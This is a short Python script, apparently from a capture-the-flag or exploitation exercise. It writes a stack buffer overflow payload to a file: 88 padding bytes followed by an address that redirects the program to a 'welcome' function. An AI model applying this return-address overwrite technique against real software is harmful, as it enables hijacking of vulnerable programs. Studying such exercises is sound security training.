import struct

# Address of the welcome function
welcome_addr = 0x400697

# Generate a payload that overwrites the return address with the address of the welcome function
payload = b"A" * 88 + struct.pack("<Q", welcome_addr)

with open("payload2", "wb") as f:
    f.write(payload)
